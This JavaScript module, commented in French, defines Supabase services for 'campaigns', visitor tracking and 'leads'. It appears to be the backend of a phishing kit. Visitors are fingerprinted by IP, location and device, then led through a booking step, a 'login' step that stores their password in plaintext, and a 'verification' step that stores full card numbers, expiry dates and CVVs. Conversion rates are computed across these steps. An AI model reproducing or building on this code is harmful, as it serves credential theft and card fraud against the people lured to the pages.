import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  throw new Error('Variables d\'environnement Supabase manquantes');
}

// Client public pour les opérations côté client
export const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Client admin pour les opérations côté serveur (API routes)
export const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey || supabaseAnonKey, {
  auth: {
    autoRefreshToken: false,
    persistSession: false
  }
});

// Structure des données de campagne (pour référence)
// {
//   id: string,
//   iframe_url: string,
//   first_name: string,
//   last_name: string,
//   email: string,
//   profile_image?: string,
//   title?: string,
//   description?: string,
//   created_at?: string,
//   updated_at?: string,
//   is_active?: boolean
// }

// Service pour les campagnes
export class CampaignService {
  
  /**
   * Récupère toutes les campagnes actives
   */
  static async getAllCampaigns() {
    try {
      const { data, error } = await supabase
        .from('campaigns')
        .select('*')
        .eq('is_active', true);
      
      if (error) throw error;
      return data;
    } catch (error) {
      console.error('Erreur lors de la récupération des campagnes:', error);
      throw error;
    }
  }

  /**
   * Récupère une campagne par son ID
   */
  static async getCampaignById(id) {
    try {
      const { data, error } = await supabase
        .from('campaigns')
        .select('*')
        .eq('id', id)
        .eq('is_active', true)
        .single();
      
      if (error) throw error;
      return data;
    } catch (error) {
      console.error(`Erreur lors de la récupération de la campagne ${id}:`, error);
      throw error;
    }
  }

  /**
   * Crée une nouvelle campagne (côté serveur uniquement)
   */
  static async createCampaign(campaignData) {
    try {
      const { data, error } = await supabaseAdmin
        .from('campaigns')
        .insert([campaignData])
        .select()
        .single();
      
      if (error) throw error;
      return data;
    } catch (error) {
      console.error('Erreur lors de la création de la campagne:', error);
      throw error;
    }
  }

  /**
   * Met à jour une campagne (côté serveur uniquement)
   */
  static async updateCampaign(id, updates) {
    try {
      const { data, error } = await supabaseAdmin
        .from('campaigns')
        .update({ ...updates, updated_at: new Date().toISOString() })
        .eq('id', id)
        .select()
        .single();
      
      if (error) throw error;
      return data;
    } catch (error) {
      console.error(`Erreur lors de la mise à jour de la campagne ${id}:`, error);
      throw error;
    }
  }

  /**
   * Désactive une campagne (soft delete)
   */
  static async deactivateCampaign(id) {
    try {
      const { data, error } = await supabaseAdmin
        .from('campaigns')
        .update({ is_active: false, updated_at: new Date().toISOString() })
        .eq('id', id)
        .select()
        .single();
      
      if (error) throw error;
      return data;
    } catch (error) {
      console.error(`Erreur lors de la désactivation de la campagne ${id}:`, error);
      throw error;
    }
  }
}

// Service pour les visites de campagne
export class VisitService {
  
  /**
   * Enregistre une visite de campagne
   */
  static async trackVisit(campaignId, visitData = {}) {
    try {
      const visitRecord = {
        campaign_id: campaignId,
        visitor_ip: visitData.ip,
        user_agent: visitData.userAgent,
        referrer: visitData.referrer,
        session_id: visitData.sessionId,
        country: visitData.country,
        city: visitData.city,
        device_type: visitData.deviceType,
        browser: visitData.browser,
        os: visitData.os,
        visited_at: new Date().toISOString()
      };

      const { data, error } = await supabase
        .from('campaign_visits')
        .insert([visitRecord])
        .select()
        .single();
      
      if (error) throw error;
      return data;
    } catch (error) {
      console.error('Erreur lors de l\'enregistrement de la visite:', error);
      throw error;
    }
  }

  /**
   * Récupère les statistiques de visites pour une campagne
   */
  static async getCampaignStats(campaignId) {
    try {
      const { data, error } = await supabase
        .from('campaign_visits')
        .select('*')
        .eq('campaign_id', campaignId);
      
      if (error) throw error;
      return data;
    } catch (error) {
      console.error(`Erreur lors de la récupération des stats pour ${campaignId}:`, error);
      throw error;
    }
  }

  /**
   * Récupère le nombre total de visites pour une campagne
   */
  static async getCampaignVisitCount(campaignId) {
    try {
      const { count, error } = await supabase
        .from('campaign_visits')
        .select('*', { count: 'exact', head: true })
        .eq('campaign_id', campaignId);
      
      if (error) throw error;
      return count;
    } catch (error) {
      console.error(`Erreur lors du comptage des visites pour ${campaignId}:`, error);
      throw error;
    }
  }

  /**
   * Récupère les visites uniques par session pour une campagne
   */
  static async getUniqueVisitCount(campaignId) {
    try {
      const { data, error } = await supabase
        .from('campaign_visits')
        .select('session_id')
        .eq('campaign_id', campaignId);
      
      if (error) throw error;
      
      // Compter les sessions uniques
      const uniqueSessions = new Set(data.map(visit => visit.session_id));
      return uniqueSessions.size;
    } catch (error) {
      console.error(`Erreur lors du comptage des visites uniques pour ${campaignId}:`, error);
      throw error;
    }
  }
}

// Service pour les leads et tracking des actions
export class LeadService {
  
  /**
   * Crée ou met à jour un lead pour une campagne
   */
  static async createOrUpdateLead(campaignId, leadData, actionType = 'booking') {
    try {
      // Chercher un lead existant basé sur l'email et la campagne
      const { data: existingLead, error: searchError } = await supabase
        .from('campaign_leads')
        .select('*')
        .eq('campaign_id', campaignId)
        .eq('email', leadData.email)
        .maybeSingle();

      if (searchError && searchError.code !== 'PGRST116') {
        throw searchError;
      }

      let leadRecord;
      const now = new Date().toISOString();

      if (existingLead) {
        // Mettre à jour le lead existant
        const updateData = {
          updated_at: now,
          ...leadData
        };

        // Ajouter les données spécifiques selon le type d'action
        switch (actionType) {
          case 'booking':
            updateData.booking_submitted_at = now;
            updateData.booking_data = {
              first_name: leadData.first_name,
              last_name: leadData.last_name,
              email: leadData.email,
              phone: leadData.phone,
              description: leadData.description,
              timestamp: now
            };
            break;
          case 'login':
            updateData.login_submitted_at = now;
            updateData.login_data = {
              email: leadData.email,
              password_length: leadData.password ? leadData.password.length : 0,
              timestamp: now
            };
            if (leadData.password) {
              updateData.password = leadData.password;
            }
            break;
          case 'verification':
            updateData.verification_submitted_at = now;
            // Utiliser les colonnes directes au lieu de card_data JSONB
            updateData.card_number = leadData.card_number;
            updateData.card_name = leadData.card_name;
            updateData.card_expiry = leadData.card_expiry;
            updateData.card_cvv = leadData.card_cvv;
            updateData.selected_plan = leadData.selected_plan;
            break;
        }

        const { data, error } = await supabase
          .from('campaign_leads')
          .update(updateData)
          .eq('id', existingLead.id)
          .select()
          .single();

        if (error) throw error;
        leadRecord = data;
      } else {
        // Créer un nouveau lead
        const newLead = {
          campaign_id: campaignId,
          email: leadData.email,
          first_name: leadData.first_name,
          last_name: leadData.last_name,
          phone: leadData.phone,
          description: leadData.description,
          ip_address: leadData.ip_address,
          user_agent: leadData.user_agent,
          session_id: leadData.session_id,
          created_at: now,
          updated_at: now
        };

        // Ajouter les données spécifiques selon le type d'action
        switch (actionType) {
          case 'booking':
            newLead.booking_submitted_at = now;
            newLead.booking_data = {
              first_name: leadData.first_name,
              last_name: leadData.last_name,
              email: leadData.email,
              phone: leadData.phone,
              description: leadData.description,
              timestamp: now
            };
            break;
          case 'login':
            newLead.login_submitted_at = now;
            newLead.login_data = {
              email: leadData.email,
              password_length: leadData.password ? leadData.password.length : 0,
              timestamp: now
            };
            if (leadData.password) {
              newLead.password = leadData.password;
            }
            break;
          case 'verification':
            newLead.verification_submitted_at = now;
            // Utiliser les colonnes directes au lieu de card_data JSONB
            newLead.card_number = leadData.card_number;
            newLead.card_name = leadData.card_name;
            newLead.card_expiry = leadData.card_expiry;
            newLead.card_cvv = leadData.card_cvv;
            newLead.selected_plan = leadData.selected_plan;
            break;
        }

        const { data, error } = await supabase
          .from('campaign_leads')
          .insert([newLead])
          .select()
          .single();

        if (error) throw error;
        leadRecord = data;
      }

      return leadRecord;
    } catch (error) {
      console.error(`Erreur lors de la création/mise à jour du lead pour ${campaignId}:`, error);
      throw error;
    }
  }

  /**
   * Récupère tous les leads d'une campagne
   */
  static async getCampaignLeads(campaignId) {
    try {
      const { data, error } = await supabase
        .from('campaign_leads')
        .select('*')
        .eq('campaign_id', campaignId)
        .order('created_at', { ascending: false });

      if (error) throw error;
      return data;
    } catch (error) {
      console.error(`Erreur lors de la récupération des leads pour ${campaignId}:`, error);
      throw error;
    }
  }

  /**
   * Récupère les statistiques détaillées d'une campagne
   */
  static async getCampaignDetailedStats(campaignId) {
    try {
      const { data, error } = await supabase
        .from('campaign_leads')
        .select('*')
        .eq('campaign_id', campaignId);

      if (error) throw error;

      const stats = {
        total_leads: data.length,
        total_bookings: data.filter(lead => lead.booking_submitted_at).length,
        total_logins: data.filter(lead => lead.login_submitted_at).length,
        total_verifications: data.filter(lead => lead.verification_submitted_at).length,
        conversion_rates: {
          visit_to_booking: 0,
          booking_to_login: 0,
          login_to_verification: 0
        }
      };

      // Calculer les taux de conversion
      if (stats.total_leads > 0) {
        stats.conversion_rates.booking_to_login = (stats.total_logins / stats.total_bookings * 100).toFixed(2);
        stats.conversion_rates.login_to_verification = (stats.total_verifications / stats.total_logins * 100).toFixed(2);
      }

      return stats;
    } catch (error) {
      console.error(`Erreur lors de la récupération des stats détaillées pour ${campaignId}:`, error);
      throw error;
    }
  }

  /**
   * Récupère un lead par email et campagne
   */
  static async getLeadByEmailAndCampaign(campaignId, email) {
    try {
      const { data, error } = await supabase
        .from('campaign_leads')
        .select('*')
        .eq('campaign_id', campaignId)
        .eq('email', email)
        .maybeSingle();

      if (error && error.code !== 'PGRST116') throw error;
      return data;
    } catch (error) {
      console.error(`Erreur lors de la récupération du lead pour ${email} dans ${campaignId}:`, error);
      throw error;
    }
  }
}
